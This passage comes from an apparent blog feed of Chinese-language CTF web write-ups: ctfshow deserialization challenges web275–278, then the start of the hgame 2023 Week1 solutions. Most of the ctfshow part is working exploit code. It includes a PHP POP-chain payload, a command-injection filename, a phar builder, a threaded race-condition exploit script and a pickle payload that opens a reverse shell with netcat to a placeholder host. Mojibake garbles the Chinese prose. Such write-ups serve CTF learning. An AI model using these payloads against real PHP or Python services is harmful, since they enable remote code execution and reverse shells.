/flag&amp;data=TzoyNzoidGhpbmtccHJvY2Vzc1xwaXBlc1xXaW5kb3dzIjoxOntzOjM0OiIAdGhpbmtccHJvY2Vzc1xwaXBlc1xXaW5kb3dzAGZpbGVzIjthOjE6e2k6MDtPOjE3OiJ0aGlua1xtb2RlbFxQaXZvdCI6Mjp7czo5OiIAKgBhcHBlbmQiO2E6MTp7czozOiJsaW4iO2E6Mjp7aTowO3M6ODoiY2FsYy5leGUiO2k6MTtzOjQ6ImNhbGMiO319czoxNzoiAHRoaW5rXE1vZGVsAGRhdGEiO2E6MTp7czozOiJsaW4iO086MTM6InRoaW5rXFJlcXVlc3QiOjM6e3M6NzoiACoAaG9vayI7YToxOntzOjc6InZpc2libGUiO2E6Mjp7aTowO3I6OTtpOjE7czo2OiJpc0FqYXgiO319czo5OiIAKgBmaWx0ZXIiO3M6Njoic3lzdGVtIjtzOjk6IgAqAGNvbmZpZyI7YToxOntzOjg6InZhcl9hamF4IjtzOjM6ImxpbiI7fX19fX19</span><br></pre></td></tr></table></figure><h2 id="web275"><a href="#web275" class="headerlink" title="web275"></a>web275</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">filter</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filecontent</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$evilfile</span>=<span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$f</span>,<span class="variable">$fn</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;filename=<span class="variable">$f</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;filecontent=<span class="variable">$fn</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">checkevil</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/php|\.\./i&#x27;</span>, <span class="variable">$this</span>-&gt;filename))&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;evilfile=<span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/flag/i&#x27;</span>, <span class="variable">$this</span>-&gt;filecontent))&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;evilfile=<span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;evilfile;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;evilfile)&#123;</span><br><span class="line">            <span class="title function_ invoke__">system</span>(<span class="string">&#x27;rm &#x27;</span>.<span class="variable">$this</span>-&gt;filename);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;fn&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$content</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;php://input&#x27;</span>);</span><br><span class="line">    <span class="variable">$f</span> = <span class="keyword">new</span> <span class="title function_ invoke__">filter</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;fn&#x27;</span>],<span class="variable">$content</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$f</span>-&gt;<span class="title function_ invoke__">checkevil</span>()===<span class="literal">false</span>)&#123;</span><br><span class="line">        <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;fn&#x27;</span>], <span class="variable">$content</span>);</span><br><span class="line">        <span class="title function_ invoke__">copy</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;fn&#x27;</span>],<span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">mt_rand</span>()).<span class="string">&#x27;.txt&#x27;</span>);</span><br><span class="line">        <span class="title function_ invoke__">unlink</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;DOCUMENT_ROOT&#x27;</span>].<span class="string">&#x27;/&#x27;</span>.<span class="variable">$_GET</span>[<span class="string">&#x27;fn&#x27;</span>]);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;work done&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;where is flag?&#x27;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ææ„å‡½æ•°é‡Œå¯ä»¥ç›´æ¥å‘½ä»¤æ‰§è¡Œ</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/?fn=;tac flag.php</span><br><span class="line">POSTï¼š</span><br><span class="line">flag=123</span><br></pre></td></tr></table></figure><h2 id="web276"><a href="#web276" class="headerlink" title="web276"></a>web276</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">filter</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filecontent</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$evilfile</span>=<span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$admin</span> = <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$f</span>,<span class="variable">$fn</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;filename=<span class="variable">$f</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;filecontent=<span class="variable">$fn</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">checkevil</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/php|\.\./i&#x27;</span>, <span class="variable">$this</span>-&gt;filename))&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;evilfile=<span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/flag/i&#x27;</span>, <span class="variable">$this</span>-&gt;filecontent))&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;evilfile=<span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;evilfile;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;evilfile &amp;&amp; <span class="variable language_">$this</span>-&gt;admin)&#123;</span><br><span class="line">            <span class="title function_ invoke__">system</span>(<span class="string">&#x27;rm &#x27;</span>.<span class="variable">$this</span>-&gt;filename);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;fn&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$content</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;php://input&#x27;</span>);</span><br><span class="line">    <span class="variable">$f</span> = <span class="keyword">new</span> <span class="title function_ invoke__">filter</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;fn&#x27;</span>],<span class="variable">$content</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$f</span>-&gt;<span class="title function_ invoke__">checkevil</span>()===<span class="literal">false</span>)&#123;</span><br><span class="line">        <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;fn&#x27;</span>], <span class="variable">$content</span>);</span><br><span class="line">        <span class="title function_ invoke__">copy</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;fn&#x27;</span>],<span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">mt_rand</span>()).<span class="string">&#x27;.txt&#x27;</span>);</span><br><span class="line">        <span class="title function_ invoke__">unlink</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;DOCUMENT_ROOT&#x27;</span>].<span class="string">&#x27;/&#x27;</span>.<span class="variable">$_GET</span>[<span class="string">&#x27;fn&#x27;</span>]);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;work done&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;where is flag?&#x27;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å…³é”®ç‚¹åœ¨äº<code>file_put_contents</code>å‡½æ•°ï¼Œåœ¨è¿™é‡Œå¯ä»¥ä½¿ç”¨<code>phar</code>ååºåˆ—åŒ–ã€‚å› ä¸º<code>copy</code>ä¼šè€—è´¹æ—¶é—´ï¼Œæ‰€ä»¥å¯ä»¥åˆ©ç”¨æ¡ä»¶ç«äº‰åœ¨æ–‡ä»¶è¢«åˆ é™¤ä¹‹å‰è¯»å–åˆ©ç”¨ã€‚</p><p><code>phar.php</code></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//ååºåˆ—åŒ–payloadæ„é€ </span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">filter</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$evilfile</span> = <span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$admin</span> = <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;filename=<span class="string">&#x27;;tac f*&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">@<span class="title function_ invoke__">unlink</span>(<span class="string">&quot;phar.phar&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//å®ä¾‹ä¸€ä¸ªpharå¯¹è±¡ä¾›åç»­æ“ä½œï¼Œåç¼€åå¿…é¡»ä¸ºphar</span></span><br><span class="line"><span class="variable">$phar</span> = <span class="keyword">new</span> <span class="title class_">Phar</span>(<span class="string">&quot;phar.phar&quot;</span>); </span><br><span class="line"><span class="comment">//å¼€å§‹ç¼“å†²å¯¹pharçš„å†™æ“ä½œ </span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">startBuffering</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">/*è®¾ç½®è¯†åˆ«pharæ‹“å±•çš„æ ‡è¯†stubï¼Œå¿…é¡»ä»¥ __HALT_COMPILER(); ?&gt; ç»“å°¾*/</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setStub</span>(<span class="string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//å°†ååºåˆ—åŒ–çš„å¯¹è±¡æ”¾å…¥è¯¥æ–‡ä»¶ä¸­</span></span><br><span class="line"><span class="variable">$o</span> = <span class="keyword">new</span> <span class="title function_ invoke__">filter</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">//å°†è‡ªå®šä¹‰çš„å½’æ¡£å…ƒæ•°æ®meta-dataå­˜å…¥manifest</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setMetadata</span>(<span class="variable">$o</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//pharæœ¬è´¨ä¸Šæ˜¯ä¸ªå‹ç¼©åŒ…ï¼Œæ‰€ä»¥è¦æ·»åŠ å‹ç¼©çš„æ–‡ä»¶å’Œæ–‡ä»¶å†…å®¹</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&quot;test.txt&quot;</span>, <span class="string">&quot;evo1ution&quot;</span>); </span><br><span class="line"><span class="comment">//åœæ­¢ç¼“å†²å¯¹pharçš„å†™æ“ä½œ</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">stopBuffering</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><code>exp.py</code></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://29f200dd-1d6b-47c1-be60-9bd59408e422.challenge.ctf.show/&#x27;</span></span><br><span class="line">f = <span class="built_in">open</span>(<span class="string">&#x27;phar.phar&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>)</span><br><span class="line">data = f.read()</span><br><span class="line">f.close()</span><br><span class="line">stop = <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">upload</span>():</span><br><span class="line">    r = requests.post(url=url+<span class="string">&#x27;?fn=phar.phar&#x27;</span>, data=data)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">read</span>():</span><br><span class="line">    <span class="keyword">global</span> stop</span><br><span class="line">    response = requests.post(url=url+<span class="string">&#x27;?fn=phar://phar.phar/&#x27;</span>, data=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;ctfshow&#123;&#x27;</span> <span class="keyword">in</span> response.text:</span><br><span class="line">        flag = re.findall(<span class="string">&#x27;ctfshow&#123;.*?&#125;&#x27;</span>, response.text)[<span class="number">0</span>]</span><br><span class="line">        <span class="built_in">print</span>(flag)</span><br><span class="line">        stop = <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> stop <span class="keyword">is</span> <span class="literal">False</span>:</span><br><span class="line">    a = threading.Thread(target=upload)</span><br><span class="line">    b = threading.Thread(target=read)</span><br><span class="line">    a.start()</span><br><span class="line">    b.start()</span><br></pre></td></tr></table></figure><h2 id="web277-278"><a href="#web277-278" class="headerlink" title="web277-278"></a>web277-278</h2><p>æŸ¥çœ‹æºç å‘ç°</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!--/backdoor?data= m=base64.b64decode(data) m=pickle.loads(m) --&gt;</span></span><br></pre></td></tr></table></figure><p>åå¼¹shellï¼ˆä¸¤é“é¢˜è²Œä¼¼éƒ½è¿‡æ»¤äº†<code>os.system</code>ï¼‰</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#encoding: utf-8</span></span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">getflag</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__reduce__</span>(<span class="params">self</span>):</span><br><span class="line">        a=<span class="string">&#x27;__import__(&quot;os&quot;).popen(&quot;nc xxx.xxx.xxx.xxx xxxx -e /bin/sh&quot;).read()&#x27;</span></span><br><span class="line">        <span class="keyword">return</span>(<span class="built_in">eval</span>,(a,))</span><br><span class="line">    <span class="comment"># ä¹Ÿå¯ä»¥è¿™ä¹ˆå†™</span></span><br><span class="line">    <span class="comment"># a=&#x27;nc xxx.xxx.xxx.xxx xxxx -e /bin/sh&#x27;</span></span><br><span class="line">        <span class="comment"># return(os.popen,(a,))</span></span><br><span class="line"></span><br><span class="line">f = getflag()</span><br><span class="line"><span class="built_in">print</span>(base64.b64encode(pickle.dumps(f)))</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> CTF_Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Web </tag>
            
            <tag> ctfshow </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>hgame 2023 webé¢˜è§£</title>
      <link href="/2023/02/05/hgame-2023-web-all/"/>
      <url>/2023/02/05/hgame-2023-web-all/</url>
      
        <content type="html"><![CDATA[<h2 id="Week1"><a href="#Week1" class="headerlink" title="Week1"></a>Week1</h2><h3 id="Classic-Childhood-Game"><a href="#Classic-Childhood-Game" class="headerlink" title="Classic Childhood Game"></a>Classic Childhood Game</h3><p><a href="http://week-1.hgame.lwsec.cn:30603/Res/Events.js">http://week-1.hgame.lwsec.cn:30603/Res/Events.js</a></p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> a = [<span class="string">&#x27;\x59\x55\x64\x6b\x61\x47\x4a\x58\x56\x6a\x64\x61\x62\x46\x5a\x31\x59\x6d\x35\x73\x53\x31\x6c\x59\x57\x6d\x68\x6a\x4d\x6b\x35\x35\x59\x56\x68\x43\x4d\x45\x70\x72\x57\x6a\x46\x69\x62\x54\x55\x31\x56\x46\x52\x43\x4d\x46\x6c\x56\x59\x7a\x42\x69\x56\x31\x59\x35&#x27;</span>];</span><br></pre></td></tr></table></figure><p>è¿è¡Œå¾—åˆ°</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[ &#x27;YUdkaGJXVjdabFZ1Ym5sS1lYWmhjMk55YVhCMEprWjFibTU1VFRCMFlVYzBiV1Y5&#x27; ]</span><br></pre></td></tr></table></figure><p><code>base64</code>è§£ç ä¸¤æ¬¡å³å¯å¾—åˆ°</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hgame&#123;fUnnyJavascript&amp;FunnyM0taG4me&#125;</span><br></pre></td></tr></table></figure><h3 id="Become-A-Member"><a href="#Become-A-Member" class="headerlink" title="Become A Member"></a>Become A Member</h3><p>ä¸€æ­¥æ­¥æ¥å°±è¡Œ</p><figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>week-1.hgame.lwsec.cn:32132</span><br><span class="line"><span class="attribute">Pragma</span><span class="punctuation">: </span>no-cache</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>no-cache</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Cute-Bunny</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>session=MTY3MjkzMTY3NXxEdi1CQkFFQ180SUFBUkFCRUFBQU9fLUNBQUlHYzNSeWFXNW5EQWdBQm5OdmJIWmxaQU5wYm5RRUFnQUVCbk4wY21sdVp3d05BQXRqYUdGc2JHVnVaMlZKWkFOcGJuUUVBZ0ItfEpkrqBezOGq9RBd9KmLkzyDgKVjXFwrAT9nHfmQOxAS; PHPSESSID=jpl68kvmg4r5ivdebfb84sa9k1; code=Vidar</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>bunnybunnybunny.com</span><br><span class="line"><span class="attribute">X-Forwarded-For</span><span class="punctuation">: </span>127.0.0.1</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>55</span><br><span class="line"></span><br><span class="line"><span class="language-json"></span></span><br><span class="line"><span class="language-json"><span class="punctuation">&#123;</span></span></span><br><span class="line"><span class="language-json"><span class="attr">&quot;username&quot;</span><span class="punctuation">:</span><span class="string">&quot;luckytoday&quot;</span><span class="punctuation">,</span></span></span><br><span class="line"><span class="language-json"><span class="attr">&quot;password&quot;</span><span class="punctuation">:</span><span class="string">&quot;happy123&quot;</span></span></span><br><span class="line"><span class="language-json"><span class="punctuation">&#125;</span></span></span><br></pre></td></tr></table></figure><p>å¾—åˆ°<code>flag</code></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hgame&#123;H0w_ArE_Y0u_T0day?&#125;</span><br></pre></td></tr></table></figure><h3 id="Guess-Who-I-Am"><a href="#Guess-Who-I-Am" class="headerlink" title="Guess Who I Am"></a>Guess Who I Am</h3><p>æºç æç¤º<a href="https://github.com/Potat0000/Vidar-Website/edit/master/src/scripts/config/member.js">https://github.com/Potat0000/Vidar-Website/edit/master/src/scripts/config/member.js</a></p><p><code>database.json</code></p><figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">[</span><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;id&quot;</span><span class="punctuation">:</span> <span class="string">&quot;ba1van4&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;intro&quot;</span><span class="punctuation">:</span> <span class="string">&quot;21çº§ / ä¸ä¼šRe / ä¸ä¼šç¾å·¥ / æ´»åœ¨æ¢¦é‡Œ / å–œæ¬¢åšä¸ä¼šçš„äº‹æƒ… / â—¼â—»ç²‰&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;avatar&quot;</span><span class="punctuation">:</span> <span class="string">&quot;https://thirdqq.qlogo.cn/g?b=sdk&amp;k=kSt5er0OQMXROy28nzTia0A&amp;s=640&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;url&quot;</span><span class="punctuation">:</span> <span class="string">&quot;https://ba1van4.icu&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span><span class="punctuation">,</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;id&quot;</span><span class="punctuation">:</span> <span class="string">&quot;yolande&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;intro&quot;</span><span class="punctuation">:</span> <span class="string">&quot;21çº§ / éå¸¸èœçš„å¯†ç æ‰‹ / å¾ˆæ‡’çš„æ‘¸é±¼çˆ±å¥½è€…ï¼Œæœ‰ç‚¹å‘†ï¼Œæƒ³å­¦ç‚¹åˆ«çš„ä½†æ˜¯ä¸€ç›´å¼€æ‘†&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;avatar&quot;</span><span class="punctuation">:</span> <span class="string">&quot;https://thirdqq.qlogo.cn/g?b=sdk&amp;k=rY328VIqDc7lNtujYic8JxA&amp;s=640&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;url&quot;</span><span class="punctuation">:</span> <span class="string">&quot;https://y01and3.github.io/&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span><span class="punctuation">,</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;id&quot;</span><span class="punctuation">:</span> <span class="string">&quot;t0hka&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;intro&quot;</span><span class="punctuation">:</span> <span class="string">&quot;21çº§ / æ—¥å¸¸è‡ªé—­çš„Reæ‰‹&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;avatar&quot;</span><span class="punctuation">:</span> <span class="string">&quot;https://thirdqq.qlogo.cn/g?b=sdk&amp;k=EYNwm1PQe8o5OcghFb4zfw&amp;s=640&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;url&quot;</span><span class="punctuation">:</span> <span class="string">&quot;https://blog.t0hka.top/&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span><span class="punctuation">,</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;id&quot;</span><span class="punctuation">:</span> <span class="string">&quot;h4kuy4&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;intro&quot;</span><span class="punctuation">:</span> <span class="string">&quot;21çº§ / èœé¸¡pwnæ‰‹ / åˆèœåˆçˆ±æ‘†&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;avatar&quot;</span><span class="punctuation">:</span> <span class="string">&quot;https://thirdqq.qlogo.cn/g?b=sdk&amp;k=BmACniaibVb6IL6LiaYF4Uvlw&amp;s=640&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;url&quot;</span><span class="punctuation">:</span> <span class="string">&quot;https://hakuya.work&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span><span class="punctuation">,</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;id&quot;</span><span class="punctuation">:</span> <span class="string">&quot;kabuto&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;intro&quot;</span><span class="punctuation">:</span> <span class="string">&quot;21çº§web / cat../../../../f*&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;avatar&quot;</span><span class="punctuation">:</span> <span class="string">&quot;https://thirdqq.qlogo.cn/g?b=sdk&amp;k=oPn2ez6Nq12GqPZG6cV7nw&amp;s=640&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;url&quot;</span><span class="punctuation">:</span> <span class="string">&quot;https://www.bilibili.com/video/BV1GJ411x7h7/&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span><span class="punctuation">,</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;id&quot;</span><span class="punctuation">:</span> <span class="string">&quot;R1esbyfe&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;intro&quot;</span><span class="punctuation">:</span> <span class="string">&quot;21çº§ / çˆ±å¥½æ­ªè„– / ç©¶æå’¸é±¼ä¸€æ¡ / çƒ­çˆ±å¹»æƒ³ / å–œæ¬¢çª¥å±æ°´ç¾¤&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;avatar&quot;</span><span class="punctuation">:</span> <span class="string">&quot;https://thirdqq.qlogo.cn/g?b=sdk&amp;k=FLyUHP6nYov19gA0ia83u8Q&amp;s=640&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;url&quot;</span><span class="punctuation">:</span> <span class="string">&quot;https://r1esbyfe.top/&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span><span class="punctuation">,</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;id&quot;</span><span class="punctuation">:</span> <span class="string">&quot;tr0uble&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;intro&quot;</span><span class="punctuation">:</span> <span class="string">&quot;21çº§ / å–œæ¬¢è‚åŸç¥çš„å¯†ç æ‰‹&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;avatar&quot;</span><span class="punctuation">:</span> <span class="string">&quot;https://thirdqq.qlogo.cn/g?b=sdk&amp;k=bgcib3gBjJGdKEf7BZ512Uw&amp;s=640&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;url&quot;</span><span class="punctuation">:</span> <span class="string">&quot;https://clingm.top&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span><span class="punctuation">,</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;id&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Roam&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;intro&quot;</span><span class="punctuation">:</span> <span class="string">&quot;21çº§ / å…¥é—¨çº§crypto&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;avatar&quot;</span><span class="punctuation">:</span> <span class="string">&quot;https://thirdqq.qlogo.cn/g?b=sdk&amp;k=5wzr9TVyw2nxOz5Jb7ceaQ&amp;s=640&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;url&quot;</span><span class="punctuation">:</span> <span class="string">&quot;#&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span><span class="punctuation">,</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;id&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Potat0&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span 